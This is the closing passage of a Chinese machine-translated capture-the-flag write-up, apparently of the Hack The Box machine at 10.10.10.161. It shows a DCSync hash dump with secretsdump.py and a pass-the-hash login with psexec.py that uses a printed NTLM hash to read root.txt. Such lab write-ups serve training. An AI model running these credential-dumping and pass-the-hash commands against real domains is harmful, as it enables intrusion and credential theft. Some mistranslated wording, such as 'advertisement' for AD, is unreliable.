b">secretsdump.py</code>工具执行DCSync来转储“管理员”用户的NTLM散列。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="f310" class="kv kw it mx b gy nb nc l nd ne"><strong class="mx iu">### DCSync</strong><br/>$ secretsdump.py htb.local/bigb0ss:bigb0ss@10.10.10.161 -just-dc-user administrator</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi ph"><img src="../Images/ea0106e6e506514e289bb3cc60e97944.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eKV6L0cYO3bu1KQAZARSuQ.png"/></div></div></figure><h2 id="7f1b" class="kv kw it bd kx ky kz dn la lb lc dp ld ki le lf lg km lh li lj kq lk ll lm ln bi translated">root.txt</h2><p id="4907" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi translated">使用<code class="fe nz oa ob mx b">psexec.py</code>，我们现在可以作为“管理员”用户登录并读取<code class="fe nz oa ob mx b">root.txt</code>文件。</p><pre class="mb mc md me gt mw mx my mz aw na bi"><span id="e030" class="kv kw it mx b gy nb nc l nd ne"><strong class="mx iu">### PSExec</strong><br/>$ psexec.py htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</span></pre><figure class="mb mc md me gt ju gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/40fa52e754694795c8ed8699248b5439.png" data-original-src="https://miro.medium.com/v2/resize:fit:1068/format:webp/1*WciYof03hHZyR-I9jNObtw.png"/></div></figure></div><div class="ab cl lt lu hx lv" role="separator"><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly lz"/><span class="lw bw bk lx ly"/></div><div class="im in io ip iq"><h1 id="8908" class="mf kw it bd kx mg oh mi la mj oi ml ld mm oj mo lg mp ok mr lj ms ol mu lm mv bi translated">结论</h1><p id="3e8e" class="pw-post-body-paragraph jx jy it jz b ka lo kc kd ke lp kg kh ki lq kk kl km lr ko kp kq ls ks kt ku im bi">_________________________________________________________________</p><p id="2e06" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">老实说，这是第一台复制真实广告的HTB机器。作为一名圣灵降临者，我真的很喜欢做这件事，也确实学到了很多。希望你也喜欢我的文章，感谢你的阅读！</p><figure class="mb mc md me gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="ng nh di ni bf nj"><div class="gh gi pj"><img src="../Images/f94596abc3b4bb73b766961353ecb444.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*06K-C1lDdC2nBBN7.png"/></div></div></figure></div></div>    
</body>
</html>